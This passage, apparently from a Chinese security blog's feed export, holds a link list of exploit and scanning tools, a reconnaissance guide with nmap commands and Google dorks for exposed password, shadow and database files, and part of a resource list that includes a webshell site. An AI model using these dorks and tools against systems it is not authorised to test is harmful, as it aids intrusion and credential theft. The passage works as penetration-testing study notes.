href="https://3h85yh.coding-pages.com/2019/10/31/apache-solr-via-velocity-template-rce-fu-xian/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/10/31/apache-solr-via-velocity-template-rce-fu-xian/</a></li></ul><h1 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h1><hr><ul><li><p>自动扫描到ssl漏洞（心血、ccs注射、sslv3贵宾犬、怪胎、logjam攻击、sslv2溺水等）。<br><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">https://github.com/hahwul/a2sv</a></p></li><li><p>SSL扫描器sslscan<br><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p></li></ul><h1 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h1><hr><ul><li><p>shack2/Struts2VulsTools: Struts2系列漏洞检查工具<br><a href="https://github.com/shack2/Struts2VulsTools" target="_blank" rel="noopener">https://github.com/shack2/Struts2VulsTools</a></p></li><li><p>HatBoy/Struts2-Scan: Struts2全漏洞扫描利用工具<br><a href="https://github.com/HatBoy/Struts2-Scan" target="_blank" rel="noopener">https://github.com/HatBoy/Struts2-Scan</a></p></li></ul><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><hr><ul><li>tomcat自动后门部署<br><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></li></ul><h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><hr><ul><li><p>shack2/javaserializetools: Java反序列化漏洞利用工具V1.0 Java反序列化相关漏洞的检查工具，<br>采用JDK 1.8+NetBeans8.2开发，软件运行必须安装JDK 1.8或者以上版本。<br>支持：weblogic xml反序列化漏洞 CVE-2017-10271/CNVD-C-2019-48814/CVE-2019-2725检查。<br><a href="https://github.com/shack2/javaserializetools" target="_blank" rel="noopener">https://github.com/shack2/javaserializetools</a></p></li><li><p>rabbitmask/WeblogicScan: Weblogic一键漏洞检测工具，V1.3<br><a href="https://github.com/dylan903/WeblogicScan" target="_blank" rel="noopener">https://github.com/dylan903/WeblogicScan</a></p></li><li><p>7kbstorm:WebLogic CNVD-C-2019_48814 CVE-2017-10271 Scan By 7kbstorm<br><a href="https://github.com/7kbstorm/WebLogic_CNVD_C2019_48814" target="_blank" rel="noopener">https://github.com/7kbstorm/WebLogic_CNVD_C2019_48814</a></p></li><li><p>dr0op/WeblogicScan: 增强版WeblogicScan、检测结果更精确、插件化,Python3支持<br><a href="https://github.com/dylan903/WeblogicScan-1" target="_blank" rel="noopener">https://github.com/dylan903/WeblogicScan-1</a></p></li></ul><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><hr><ul><li><p><a href="https://3h85yh.coding-pages.com/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现</a></p></li><li><p>zerosum0x0/CVE-2019-0708: Scanner PoC for CVE-2019-0708 RDP RCE vuln<br><a href="https://github.com/zerosum0x0/CVE-2019-0708" target="_blank" rel="noopener">https://github.com/zerosum0x0/CVE-2019-0708</a></p></li><li><p>PowerSploit - A PowerShell Post-Exploitation Framework<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p></li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><hr><ul><li><p>git泄露利用EXP<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p></li><li><p>CVE-2016-2107<br><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p></li><li><p>CVE-2015-7547 POC<br><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p></li><li><p>Jenkins CommonCollections EXP<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p></li><li><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p></li><li><p>XcodeGhost木马样本<br><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习总结篇—信息收集</title>
      <link href="/2019/08/23/xue-xi-zong-jie-pian-xin-xi-shou-ji/"/>
      <url>/2019/08/23/xue-xi-zong-jie-pian-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>目标资产信息搜集的程度，决定渗透过程的复杂程度。<br>目标主机信息搜集的深度，决定后渗透权限持续把控。</p><p>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强有力的保证。</p><h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h1><h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>被动信息收集：利用第三方的服务对目标进行访问了解，<br>比如whois查询、Google搜索、Shodan搜索等等</p><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>主动信息收集：通过直接访问、扫描网站，这种流量将流经网站</p><h1 id="0x02-收集方向"><a href="#0x02-收集方向" class="headerlink" title="0x02 收集方向"></a>0x02 收集方向</h1><h2 id="一、whois查询"><a href="#一、whois查询" class="headerlink" title="一、whois查询"></a>一、whois查询</h2><p>可用信息：邮箱地址，注册人，作者信息</p><ul><li><a href="https://whois.aliyun.com/" target="_blank" rel="noopener">https://whois.aliyun.com/</a>  //阿里</li><li><a href="https://www.whois365.com/cn/" target="_blank" rel="noopener">https://www.whois365.com/cn/</a>  //全球查</li><li><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a>  //中国互联网信息中心</li><li><a href="http://whois.domaintools.com/" target="_blank" rel="noopener">http://whois.domaintools.com/</a>  //Whois Lookup, Domain Availability &amp; IP Search - DomainTools</li><li><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a>  //站长</li><li><a href="https://x.threatbook.cn/%20" target="_blank" rel="noopener">https://x.threatbook.cn/ </a>  //微步</li><li><a href="http://whois.aizhan.com" target="_blank" rel="noopener">http://whois.aizhan.com</a>  //爱站</li><li>kali命令:  <code>whois www.xxx.com</code></li></ul><h2 id="二、备案查询"><a href="#二、备案查询" class="headerlink" title="二、备案查询"></a>二、备案查询</h2><p>注册人姓名</p><ul><li><a href="http://tianyancha.com" target="_blank" rel="noopener">http://tianyancha.com</a>  //天眼查</li><li><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a>  //ICP备案查询网</li><li><a href="http://beian.miit.gov.cn" target="_blank" rel="noopener">http://beian.miit.gov.cn</a>   //工信部</li><li><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a>    //国家企业信用信息公示系统</li></ul><h2 id="三、端口"><a href="#三、端口" class="headerlink" title="三、端口"></a>三、端口</h2><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><ul><li><a href="http://tool.chinaz.com/port" target="_blank" rel="noopener">http://tool.chinaz.com/port</a></li><li><a href="http://www.shungg.cn/sm/" target="_blank" rel="noopener">http://www.shungg.cn/sm/</a></li><li><a href="http://coolaf.com/tool/port" target="_blank" rel="noopener">http://coolaf.com/tool/port</a></li><li><a href="https://tool.lu/portscan/" target="_blank" rel="noopener">https://tool.lu/portscan/</a></li><li><a href="http://tool.cc/port/" target="_blank" rel="noopener">http://tool.cc/port/</a></li><li><a href="http://duankou.wlphp.com/" target="_blank" rel="noopener">http://duankou.wlphp.com/</a></li><li><a href="https://www.astrill.com/zh/port-scan" target="_blank" rel="noopener">https://www.astrill.com/zh/port-scan</a></li></ul><h3 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h3><pre><code>nmap -A -v -T4   192.168.1.1  //查看开放端口masscan -p80 192.168.1.1/24 --rate=10000    //测试目标指定端口netstat -pantu    //测试kalikali本身开放端口</code></pre><h2 id="三、子域名"><a href="#三、子域名" class="headerlink" title="三、子域名"></a>三、子域名</h2><p>国外组织统计的最受欢迎子域名列表：<br><a href="https://github.com/bitquark/dnspop/tree/master/results" target="_blank" rel="noopener">https://github.com/bitquark/dnspop/tree/master/results</a></p><h3 id="1-搜索引擎"><a href="#1-搜索引擎" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><ul><li>site:baidu.com</li></ul><h3 id="2-有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。"><a href="#2-有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。" class="headerlink" title="2.有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。"></a>2.有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</h3><ul><li><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></li><li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a></li><li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a></li><li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li><li><a href="https://searchdns.netcraft.com/" target="_blank" rel="noopener">https://searchdns.netcraft.com/</a></li><li><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></li><li><a href="https://www.virustotal.com/gui/home/upload" target="_blank" rel="noopener">Virustotal</a>//输入”domain:target.com”,返回子域名列表和一些辅助信息。</li></ul><h3 id="3-基于SSL证书查询"><a href="#3-基于SSL证书查询" class="headerlink" title="3.基于SSL证书查询"></a>3.基于SSL证书查询</h3><ul><li><a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a> </li><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://spyse.com/search/certificate" target="_blank" rel="noopener">https://spyse.com/search/certificate</a></li><li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li></ul><h3 id="4-在线爆破"><a href="#4-在线爆破" class="headerlink" title="4.在线爆破"></a>4.在线爆破</h3><ul><li><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a>   //站长工具</li><li><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a>     //在线子域名爆破工具</li><li><a href="http://z.zcjun.com/" target="_blank" rel="noopener">http://z.zcjun.com/</a>    //在线子域名爆破-子成君提供</li><li><a href="https://dns.bufferover.run/dns?q=," target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=,</a></li></ul><h3 id="5-工具"><a href="#5-工具" class="headerlink" title="5.工具"></a>5.工具</h3><ul><li><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">OneForAll</a></li><li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain</a></li><li>Maltego</li><li>Layer 子域名挖掘机</li><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> </li><li><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">ESD: Enumeration sub domains(枚举子域名)</a></li><li>Nmap   //使用 –script dns-brute 脚本</li></ul><h2 id="四、旁站C段"><a href="#四、旁站C段" class="headerlink" title="四、旁站C段"></a>四、旁站C段</h2><h3 id="1-搜索引擎-1"><a href="#1-搜索引擎-1" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><p>利用google搜索C段服务器信息<br><code>site:218.87.21.*</code></p><h3 id="2-网站"><a href="#2-网站" class="headerlink" title="2.网站"></a>2.网站</h3><ul><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a>   //在线旁站|C段|必应接口C段|同ip网站 - phpinfo.me</li><li><a href="http://www.114best.com/ip/" target="_blank" rel="noopener">http://www.114best.com/ip/</a></li><li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></li></ul><h2 id="五、指纹识别"><a href="#五、指纹识别" class="headerlink" title="五、指纹识别"></a>五、指纹识别</h2><h3 id="1-在线识别"><a href="#1-在线识别" class="headerlink" title="1.在线识别"></a>1.在线识别</h3><ul><li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></li><li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li></ul><h3 id="2-本地工具"><a href="#2-本地工具" class="headerlink" title="2.本地工具"></a>2.本地工具</h3><ul><li>御剑cms</li><li>大禹cms</li></ul><h3 id="3-kali"><a href="#3-kali" class="headerlink" title="3.kali"></a>3.kali</h3><ul><li>whatweb <a href="https://www.baidubaidu.com" target="_blank" rel="noopener">https://www.baidubaidu.com</a></li></ul><h3 id="4-cms漏洞利用"><a href="#4-cms漏洞利用" class="headerlink" title="4.cms漏洞利用"></a>4.cms漏洞利用</h3><ul><li><a href="https://bugss.shuimugan.com" target="_blank" rel="noopener">https://bugss.shuimugan.com</a>     //乌云查找相关漏洞</li></ul><h2 id="六、敏感目录"><a href="#六、敏感目录" class="headerlink" title="六、敏感目录"></a>六、敏感目录</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具:"></a>工具:</h3><ul><li>御剑后台扫描</li><li>wwwscan</li></ul><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ul><li><code>dirb http://www.baidu.com</code>      //命令工具</li><li>dirbuster         //界面化工具</li><li><code>wpscan -u http://www.baidu.comcom</code>  //kali扫描WordPress漏洞</li></ul><h2 id="七、敏感信息"><a href="#七、敏感信息" class="headerlink" title="七、敏感信息"></a>七、敏感信息</h2><h3 id="1-网络返回包"><a href="#1-网络返回包" class="headerlink" title="1.网络返回包"></a>1.网络返回包</h3><ul><li>F12查看系统，php版本</li></ul><h3 id="2-Github"><a href="#2-Github" class="headerlink" title="2.Github"></a>2.Github</h3><ul><li>site:Github password     //github上查找敏感信息</li></ul><h3 id="3-搜索引擎"><a href="#3-搜索引擎" class="headerlink" title="3.搜索引擎"></a>3.搜索引擎</h3><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><ul><li>site</li><li>inurl</li><li>intext</li><li>filetype</li><li>intitle</li><li>link           //与<a href="http://www.xxx.com做了外链的网站" target="_blank" rel="noopener">www.xxx.com做了外链的网站</a></li><li>info      //搜索网页信息</li><li>+　　把google可能忽略的字列如查询范围。</li><li>-　　把某个字忽略，例子：新加 -坡。</li><li>~　　同意词。</li><li>.　　单一的通配符。</li><li>*　　通配符，可代表多个字母。</li><li>“”　　精确查询。</li></ul><h5 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h5><pre><code>site:xx.com intext:管理|后台|登录|用户名|密码|系统|账号site:xx.com inurl:login/admin/manage/manager/admin_login/systemsite:xx.com intitle:管理|后台|登录</code></pre><h5 id="搜索不同国家网站"><a href="#搜索不同国家网站" class="headerlink" title="搜索不同国家网站"></a>搜索不同国家网站</h5><ul><li>inurl:tw　　台湾</li><li>inurl:jp　　日本</li></ul><h5 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h5><pre><code>inurl:editor/db/ inurl:eWebEditor/db/ inurl:bbs/data/ inurl:databackup/ inurl:blog/data/ inurl:\boke\data inurl:bbs/database/ inurl:conn.asp inc/conn.aspServer.mapPath(“.mdb”)allinurl:bbs datafiletype:mdb inurl:databasefiletype:inc conninurl:data filetype:mdbintitle:&quot;index of&quot; data</code></pre><h5 id="搜索敏感信息"><a href="#搜索敏感信息" class="headerlink" title="搜索敏感信息"></a>搜索敏感信息</h5><pre><code>intitle:&quot;index of&quot; etcintitle:&quot;Index of&quot; .sh_historyintitle:&quot;Index of&quot; .bash_historyintitle:&quot;index of&quot; passwdintitle:&quot;index of&quot; people.lstintitle:&quot;index of&quot; pwd.dbintitle:&quot;index of&quot; etc/shadowintitle:&quot;index of&quot; spwdintitle:&quot;index of&quot; master.passwdintitle:&quot;index of&quot; htpasswdinurl:service.pwd</code></pre><h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><p>shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。<br>地址：<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><h5 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h5><p>详见：<br><a href="https://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="noopener">Shodan 新手入坑指南</a></p><pre><code>hostname：　　搜索指定的主机或域名，例如 hostname:”google”port：　　搜索指定的端口或服务，例如 port:”21”country：　　搜索指定的国家，例如 country:”CN”city：　　搜索指定的城市，例如 city:”Hefei”org：　　搜索指定的组织或公司，例如 org:”google”isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”version：　　搜索指定的软件版本，例如 version:”1.6.2”geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</code></pre><h4 id="钟馗之眼-ZoomEye"><a href="#钟馗之眼-ZoomEye" class="headerlink" title="钟馗之眼(ZoomEye)"></a>钟馗之眼(ZoomEye)</h4><p>钟馗之眼(ZoomEye)搜索引擎偏向web应用层面的搜索。<br>地址：<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p><pre><code>app:nginx　　组件名ver:1.0　　版本os:windows　　操作系统country:”China”　　国家city:”hangzhou”　　城市port:80　　端口hostname:google　　主机名site:thief.one　　网站域名desc:nmask　　描述keywords:nmask’blog　　关键词service:ftp　　服务类型ip:8.8.8.8　　ip地址cidr:8.8.8.8/24　　ip地址段</code></pre><h4 id="FoFa搜索引擎"><a href="#FoFa搜索引擎" class="headerlink" title="FoFa搜索引擎"></a>FoFa搜索引擎</h4><p>FoFa搜索引擎偏向资产搜索。<br>地址：<a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a></p><h5 id="基本语法-2"><a href="#基本语法-2" class="headerlink" title="基本语法"></a>基本语法</h5><pre><code>title=”abc” 从标题中搜索abc。例：标题中有北京的网站。header=”abc” 从http头中搜索abc。例：jboss服务器。body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</code></pre><h5 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h5><pre><code>title=”powered by” &amp;&amp; title!=discuztitle!=”powered by” &amp;&amp; body=discuz( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn”</code></pre><h4 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h4><p>censys搜索引擎功能与shodan类似，以下几个文档信息。<br>地址：<a href="https://www.censys.io/" target="_blank" rel="noopener">https://www.censys.io/</a></p><pre><code>https://www.censys.io/certificates/help 帮助文档https://www.censys.io/ipv4?q=  ip查询https://www.censys.io/domain?q=  域名查询https://www.censys.io/certificates?q= 证书查询</code></pre><h5 id="基本语法-3"><a href="#基本语法-3" class="headerlink" title="基本语法"></a>基本语法</h5><pre><code>23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not80.http.get.status_code: 200　　指定状态80.http.get.status_code:[200 TO 300]　　200-300之间的状态码location.country_code: DE　　国家protocols: (“23/telnet” or “21/ftp”)　　协议tags: scada　　标签80.http.get.headers.server：nginx　　服务器类型版本autonomous_system.description: University　　系统描述正则</code></pre><h4 id="Dnsdb搜索引擎"><a href="#Dnsdb搜索引擎" class="headerlink" title="Dnsdb搜索引擎"></a>Dnsdb搜索引擎</h4><p>dnsdb搜索引擎是一款针对dbs解析的查询平台。<br>地址：<a href="https://www.dnsdb.io/" target="_blank" rel="noopener">https://www.dnsdb.io/</a></p><h5 id="查询语法"><a href="#查询语法" class="headerlink" title="查询语法"></a>查询语法</h5><ul><li><p>搜索语法<br>DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.</p></li><li><p>域名查询条件<br>域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.<br>例如查询google.com 的所有DNS记录: domain:google.com.<br>域名查询可以省略domain:.</p></li><li><p>主机查询条件<br>查询语法:host:<br>例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com<br>主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值</p></li><li><p>按DNS记录类型查询<br>查询语法: type:.<br>例如只查询A记录: type:a<br>使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法</p></li><li><p>按IP限制<br>查询语法: ip:<br>查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效<br>查询指定IP范围: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0/24<br>IP最大范围限制65536个</p></li><li><p>条件组合查询的例子<br>查询google.com的所有A记录: google.com type:a</p></li></ul><h2 id="八、真实IP"><a href="#八、真实IP" class="headerlink" title="八、真实IP"></a>八、真实IP</h2><p>详见：<br><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491648&idx=1&sn=64d948bfc39f7122ce7aa5da63536b42" target="_blank" rel="noopener">绕过 CDN 寻找真实 IP 地址的各种姿势</a></p><h3 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h3><p>ping 如果网站前有cdn标识，则为cdn服务器<br>站长之家 看返回值</p><h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><ul><li>内部邮箱源</li><li>网站phpinfo文件</li><li>SSL证书探测</li><li>分站ip，CDN很贵</li><li>多地Ping</li></ul><p><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a><br><a href="https://tools.ipip.net/ping.php" target="_blank" rel="noopener">https://tools.ipip.net/ping.php</a><br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></p><ul><li>查询域名解析记录</li></ul><p><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a><br><a href="http://www.ip138.com/" target="_blank" rel="noopener">http://www.ip138.com/</a><br><a href="https://www.17ce.com/" target="_blank" rel="noopener">https://www.17ce.com/</a><br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a><br><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p><h3 id="真实ip"><a href="#真实ip" class="headerlink" title="真实ip"></a>真实ip</h3><p>搜索出来的ip直接访问，看是否正常访问。<br>返回错误则不是。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://thief.one/2017/05/19/1/" target="_blank" rel="noopener">【渗透神器系列】搜索引擎 | nmask’s Blog</a><br><a href="https://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="noopener">Shodan 新手入坑指南</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&mid=2247485173&idx=1&sn=39fd47eea1291b470aadccfabc32ff92" target="_blank" rel="noopener">信息收集——初篇</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491648&idx=1&sn=64d948bfc39f7122ce7aa5da63536b42" target="_blank" rel="noopener">绕过 CDN 寻找真实 IP 地址的各种姿势</a></p>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习总结篇—资源整理</title>
      <link href="/2019/08/22/xue-xi-zong-jie-pian-zi-yuan-zheng-li/"/>
      <url>/2019/08/22/xue-xi-zong-jie-pian-zi-yuan-zheng-li/</url>
      
        <content type="html"><![CDATA[<p><strong>资源工具自用收集</strong></p><h1 id="0x01-资源整合"><a href="#0x01-资源整合" class="headerlink" title="0x01 资源整合"></a>0x01 资源整合</h1><h2 id="资源导航"><a href="#资源导航" class="headerlink" title="资源导航"></a>资源导航</h2><hr><ul><li><p><a href="https://github.com/dylan903/security_circle_2017" target="_blank" rel="noopener">安全技能树小密圈2017精选</a></p></li><li><p>Storm Blog|关注网络安全|<a href="http://www.7kb.org" target="_blank" rel="noopener">www.7kb.org</a><br><a href="https://www.7kb.org/" target="_blank" rel="noopener">https://www.7kb.org/</a></p></li><li><p>Xise菜刀_Xise菜刀下载_中国菜刀_免杀大马_最新免杀大马<br><a href="http://caidaome.com/" target="_blank" rel="noopener">http://caidaome.com/</a></p></li><li><p>nmask’s Blog   大佬博客 导航<br><a href="https://thief.one/SecWeb/" target="_blank" rel="noopener">https://thief.one/SecWeb/</a></p></li><li><p>网络安全与渗透测试工具导航<br><a href="https://github.com/dylan903/SecBox/blob/master/README.md" target="_blank" rel="noopener">https://github.com/dylan903/SecBox/blob/master/README.md</a></p></li><li><p>干货集中营-算命縖子<br><a href="http://www.nmd5.com/test/index.php" target="_blank" rel="noopener">http://www.nmd5.com/test/index.php</a></p></li><li><p>penetration渗透 超全面的渗透资料💯 包含：0day，xss，sql注入，提权……<br><a href="https://github.com/dylan903/penetration" target="_blank" rel="noopener">https://github.com/dylan903/penetration</a></p></li><li><p>Web-Security-Learning<br><a href="https://chybeta.github.io/2017/08/19/Web-Security-Learning/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/19/Web-Security-Learning/</a></p></li><li><p>Study Notes For Web Hacking / Web安全学习笔记<br><a href="https://github.com/dylan903/Learn-Web-Hacking" target="_blank" rel="noopener">https://github.com/dylan903/Learn-Web-Hacking</a></p></li><li><p>A collection of awesome penetration testing resources, tools and other shiny things<br><a href="https://github.com/dylan903/awesome-pentest" target="_blank" rel="noopener">https://github.com/dylan903/awesome-pentest</a></p></li><li><p>information security Tools Box （信息安全工具以及资源集合）<br><a href="https://github.com/dylan903/Sec-Box" target="_blank" rel="noopener">https://github.com/dylan903/Sec-Box</a></p></li></ul><h2 id="文章收集"><a href="#文章收集" class="headerlink" title="文章收集"></a>文章收集</h2><hr><ul><li><p>public-pentesting-reports<br>Curated list of public penetration test reports released by several consulting firms and academic security groups<br><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports</a></p></li><li><p>Collection of quality safety articles<br><a href="https://github.com/dylan903/collection-document" target="_blank" rel="noopener">collection-document</a></p></li><li><p>Top 100 Hacking &amp; Security E-Books<br><a href="https://github.com/dylan903/Hacking-Security-Ebooks" target="_blank" rel="noopener">Hacking-Security-Ebooks</a></p></li><li><p>应急响应实战笔记，一个安全工程师的自我修养。<br><a href="https://github.com/dylan903/Emergency-Response-Notes" target="_blank" rel="noopener">Emergency-Response-Notes</a></p></li><li><p>Micro8 Online<br><a href="https://github.com/dylan903/Micro8-HTML" target="_blank" rel="noopener">Micro8-HTML</a></p></li><li><p>PayloadsAllTheThings/BOOKS<br><a href="https://github.com/dylan903/PayloadsAllTheThings/blob/master/BOOKS.md" target="_blank" rel="noopener">https://github.com/dylan903/PayloadsAllTheThings/blob/master/BOOKS.md</a></p></li><li><p>CTF竞赛入门指南：CTF-All-In-One<br><a href="https://github.com/firmianay/CTF-All-In-One" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One</a></p></li></ul><h2 id="工具整合"><a href="#工具整合" class="headerlink" title="工具整合"></a>工具整合</h2><hr><ul><li><p>K8tools<br><a href="https://github.com/k8gege/K8tools" target="_blank" 